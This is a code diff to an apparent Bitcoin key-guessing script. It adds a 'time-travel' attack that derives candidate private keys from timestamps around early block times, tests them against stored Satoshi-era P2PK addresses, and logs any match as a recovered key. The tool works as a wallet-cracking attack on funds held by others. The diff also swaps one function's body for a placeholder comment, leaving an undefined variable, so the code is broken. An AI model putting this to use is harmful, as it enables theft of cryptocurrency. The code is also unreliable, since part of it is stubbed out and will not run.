@@ -334,44 +334,50 @@ def gen_passphrase_variant_seeds():
 
 def gen_low_entropy_combos():
     """Generate seeds from small subsets of the wordlist (2-5 unique words)."""
-    print("  [Strategy 6] Low-entropy word combinations...")
+    # ... existing implementation ...
+    return seeds
+
+def gen_timestamp_seeds():
+    """
+    [Strategy 7] PRNG Time-Travel Attack.
+    Generates keys based on block timestamps (early Satoshi era).
+    Many early scripts seeded PRNGs with the current system time.
+    """
+    print("  [Strategy 7] PRNG Time-Travel (Timestamps)...")
     seeds = []
     
-    # Most common English words that appear in BIP39
-    common_words = [w for w in ['abandon', 'able', 'about', 'above', 'action',
-                                 'air', 'all', 'also', 'always', 'any',
-                                 'baby', 'before', 'begin', 'best', 'book',
-                                 'can', 'change', 'come', 'day', 'end',
-                                 'first', 'good', 'great', 'have', 'help',
-                                 'just', 'know', 'life', 'like', 'love',
-                                 'man', 'money', 'name', 'new', 'one',
-                                 'other', 'people', 'right', 'say', 'time',
-                                 'very', 'want', 'way', 'will', 'world',
-                                 'year', 'zero'] if w in WORDLIST]
+    # Get timestamps of early blocks from DB
+    conn = get_connection()
+    c = conn.cursor()
+    # We'll use the type 'P2PK (Block XXX)' to find block numbers
+    c.execute("SELECT address, type FROM addresses WHERE type LIKE 'P2PK (Block %)'")
+    targets = c.fetchall()
+    conn.close()
     
-    # Try 2-word patterns filling 12 positions
-    count = 0
-    for w1 in common_words[:20]:
-        for w2 in common_words[:20]:
-            if w1 == w2:
-                continue
-            # Alternating pattern
-            idx1 = WORDLIST.index(w1)
-            idx2 = WORDLIST.index(w2)
-            bits = (format(idx1, '011b') + format(idx2, '011b')) * 6
-            entropy_bytes = int(bits[:128], 2).to_bytes(16, 'big')
-            try:
-                phrase = M.to_mnemonic(entropy_bytes)
-                seeds.append(phrase)
-                count += 1
-            except Exception:
-                pass
-            if count >= 500:
-                break
-        if count >= 500:
-            break
-    
-    print(f"    Generated {len(seeds)} low-entropy combination seeds")
+    # Standard Satoshi Era Block Timestamps (Approximate)
+    # Block 0: 1231006505
+    for addr, addr_type in targets:
+        try:
+            block_num = int(addr_type.split(' ')[2].rstrip(')'))
+            # We approximate the block time if we don't have it exactly
+            # Block time = Genesis + (BlockNum * 600)
+            approx_time = 1231006505 + (block_num * 600)
+            
+            # Check a 2-hour window around the block time
+            for ts in range(approx_time - 3600, approx_time + 3600, 1):
+                # Try direct TS as private key
+                pk_int = ts % P_CURVE
+                if pk_int > 0:
+                    seeds.append((pk_int.to_bytes(32, 'big'), f"Timestamp {ts} (Block {block_num})"))
+                
+                # Try SHA256(TS)
+                pk_int = int.from_bytes(hashlib.sha256(str(ts).encode()).digest(), 'big') % P_CURVE
+                if pk_int > 0:
+                    seeds.append((pk_int.to_bytes(32, 'big'), f"SHA256(Timestamp {ts})"))
+        except:
+            continue
+            
+    print(f"    Generated {len(seeds)} timestamp-based candidate keys")
     return seeds
 
 
@@ -406,7 +412,16 @@ def run_seed_guesser(target_addresses=None):
     all_seeds.extend(gen_passphrase_variant_seeds())
     all_seeds.extend([(s, "") for s in gen_low_entropy_combos()])
     
-    # Deduplicate
+    # Run strategy 7 separately because it generates direct keys, not mnemonics
+    timestamp_keys = gen_timestamp_seeds()
+    print(f"Testing {len(timestamp_keys)} direct timestamp keys...")
+    for pk_bytes, method in timestamp_keys:
+        for addr in privkey_to_all_addresses(pk_bytes):
+            if addr in target_addresses:
+                print(f"  !!! KEY FOUND VIA TIMESTAMP: {addr} ({method})")
+                add_recovered_key(addr, pk_bytes.hex(), method=method)
+    
+    # Deduplicate mnemonics
     all_seeds = list(set(all_seeds))
     print(f"\nTotal candidate seeds to test: {len(all_seeds)}")
     print(f"{'='*70}")
